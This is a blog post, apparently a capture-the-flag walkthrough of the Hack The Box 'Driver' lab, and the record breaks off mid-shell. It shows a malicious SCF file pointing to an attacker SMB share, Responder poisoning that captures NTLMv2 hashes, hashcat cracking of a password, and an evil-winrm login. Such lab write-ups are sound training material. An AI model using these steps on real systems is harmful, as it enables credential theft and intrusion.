@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 WindowsDifficulty:	EasyPoints:	20Release:	02 Oct 2021IP:	10.10.11.106">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[Driver]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/10/03/driver/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 WindowsDifficulty:	EasyPoints:	20Release:	02 Oct 2021IP:	10.10.11.106">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2084.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2085.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2086.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2087.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2088.jpg">
+<meta property="article:published_time" content="2021-10-03T11:23:47.000Z">
+<meta property="article:modified_time" content="2022-02-27T01:10:36.554Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2084.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/10/03/driver/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/10/03/driver/","path":"2021/10/03/driver/","title":"Hack-The-Box-walkthrough[Driver]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[Driver] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nmap"><span class="nav-number">2.1.</span> <span class="nav-text">Nmap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">3.</span> <span class="nav-text">web</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#root"><span class="nav-number">4.</span> <span class="nav-text">root</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#workaround"><span class="nav-number">5.</span> <span class="nav-text">workaround</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">6.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">7.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/10/03/driver/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[Driver] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[Driver]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-10-03 19:23:47" itemprop="dateCreated datePublished" datetime="2021-10-03T19:23:47+08:00">2021-10-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-02-27 09:10:36" itemprop="dateModified" datetime="2022-02-27T09:10:36+08:00">2022-02-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Windows<br>Difficulty:	Easy<br>Points:	20<br>Release:	02 Oct 2021<br>IP:	10.10.11.106</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2084.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/driver]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.11.106</span></span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Microsoft IIS httpd 10.0</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>we are greeted with a pop up for login and admin&#x2F;admin got me it.</p>
+<p>so over here it seems like we can upload a malicious firmware and get rev shell</p>
+<p>so after looking for exploits I could not get any but the thing was, it was probably saving the files in the smb share of windows.</p>
+<p>So here we are having remote file upload and we can then perform SMB Exploit via NTLM Capture</p>
+<ul>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL3NtYi1wZW5ldHJhdGlvbi10ZXN0aW5nLXBvcnQtNDQ1Lw==">SMB Penetration Testing Port 445<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly9zcWwtLWluamVjdGlvbi5ibG9nc3BvdC5jb20vcC9zbWIuaHRtbA==">SMB - SCF File Attacks - NetNTLMv2 hash grab<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+</ul>
+<p>crate file @shell.scf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.14.18\share\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>
+
+<p>start responder and</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -wrf --lm -v -I tun0</span><br></pre></td></tr></table></figure>
+
+<p>upload the file via website</p>
+<p>wait and get the hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/driver]</span><br><span class="line">└─<span class="comment"># responder -wrf --lm -v -I tun0                                                                                                </span></span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    DNS/MDNS                   [ON]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [ON]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line">    DCE-RPC server             [ON]</span><br><span class="line">    WinRM server               [ON]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [ON]</span><br><span class="line">    Fingerprint hosts          [ON]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun0]</span><br><span class="line">    Responder IP               [10.10.14.18]</span><br><span class="line">    Challenge <span class="built_in">set</span>              [random]</span><br><span class="line">    Don<span class="string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Current Session Variables:</span></span><br><span class="line"><span class="string">    Responder Machine Name     [WIN-M7QNFNTIUS5]</span></span><br><span class="line"><span class="string">    Responder Domain Name      [DF9J.LOCAL]</span></span><br><span class="line"><span class="string">    Responder DCE-RPC Port     [46013]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Listening for events...                                                                                                       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Client   : 10.10.11.106</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Username : DRIVER\tony</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Hash     : tony::DRIVER:5d8b8082ef776c2f:A4327A2CB72A96CEEF1D04DB2636CFD0:010100000000000003D6341085B8D7014158EED0F177C50C00000000020000000000000000000000                                                                                             </span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Client   : 10.10.11.106</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Username : DRIVER\tony</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Hash     : tony::DRIVER:d749730738bd8506:D1A35D9A4D7ABF916EECA6D6DE25B8A2:01010000000000003E05281185B8D7012A802D00F1FA40CD00000000020000000000000000000000                                                                                             </span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Client   : 10.10.11.106</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Username : DRIVER\tony</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Hash     : tony::DRIVER:bd3860c306965ce9:1A699EF18915FF2D76CB965CB4F7E914:0101000000000000511B141285B8D7013F3164731463EC4A00000000020000000000000000000000                                                                                             </span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Client   : 10.10.11.106</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Username : DRIVER\tony</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Hash     : tony::DRIVER:c92c9da2314211e4:DCA91CAF8B4ADFB918B987CA6226FD6A:0101000000000000FF16001385B8D70184E50D8129DC7EE500000000020000000000000000000000                                                                                             </span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Client   : 10.10.11.106</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Username : DRIVER\tony</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Hash     : tony::DRIVER:352a6a321addb118:B201C24A20A2010D1B280F4EC2A6380A:01010000000000003CBDE91385B8D7017D6ACD474960E4F800000000020000000000000000000000                                                                                             </span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Client   : 10.10.11.106</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Username : DRIVER\tony</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Hash     : tony::DRIVER:7e2adbd91e974841:6E1A74933AE2E19D06C8C03F61D44A89:0101000000000000836BD31485B8D70118B057D21124042400000000020000000000000000000000                                                                                             </span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Client   : 10.10.11.106</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Username : DRIVER\tony</span></span><br><span class="line"><span class="string">[SMB] NTLMv2 Hash     : tony::DRIVER:9d11f8dc195ba210:633773D52C813CC8C252F5F100B67287:0101000000000000340ABD1585B8D701B38BD32127FADDD500000000020000000000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>hashcat id: 5600</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tony::DRIVER:5d8b8082ef776c2f:A4327A2CB72A96CEEF1D04DB2636CFD0:010100000000000003D6341085B8D7014158EED0F177C50C00000000020000000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>cracked</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 0 -m 5600 password.txt rockyou.txt</span><br><span class="line"></span><br><span class="line">TONY::DRIVER:5d8b8082ef776c2f:a4327a2cb72a96ceef1d04db2636cfd0:010100000000000003d6341085b8d7014158eed0f177c50c00000000020000000000000000000000:liltony</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: NetNTLMv2</span><br><span class="line">Hash.Target......: TONY::DRIVER:5d8b8082ef776c2f:a4327a2cb72a96ceef1d0...000000</span><br><span class="line">Time.Started.....: Sun Oct 03 19:56:45 2021 (1 sec)</span><br><span class="line">Time.Estimated...: Sun Oct 03 19:56:46 2021 (0 secs)</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#2.........: 31819.1 kH/s (6.38ms) @ Accel:1024 Loops:1 Thr:64 Vec:1</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</span><br><span class="line">Progress.........: 1048576/14344360 (7.31%)</span><br><span class="line">Rejected.........: 0/1048576 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344360 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#2...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidates.<span class="comment">#2....: 123456 -&gt; Leslie08</span></span><br><span class="line">Hardware.Mon.<span class="comment">#2..: Temp: 49c Util:  6% Core:1632MHz Mem:3802MHz Bus:16</span></span><br><span class="line"></span><br><span class="line">Started: Sun Oct 03 19:56:42 2021</span><br><span class="line">Stopped: Sun Oct 03 19:56:48 2021</span><br></pre></td></tr></table></figure>
+
+<p>tony&#x2F;liltony</p>
+<p>use evil-winrm to login</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/driver]</span><br><span class="line">└─<span class="comment"># evil-winrm -i 10.10.11.106 -u tony -p liltony</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2.4</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\tony\Documents&gt; <span class="built_in">cd</span> ../Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\tony\Desktop&gt; <span class="built_in">whoami</span></span><br><span class="line">driver\tony</span><br><span class="line">*Evil-WinRM* PS C:\Users\tony\Desktop&gt; <span 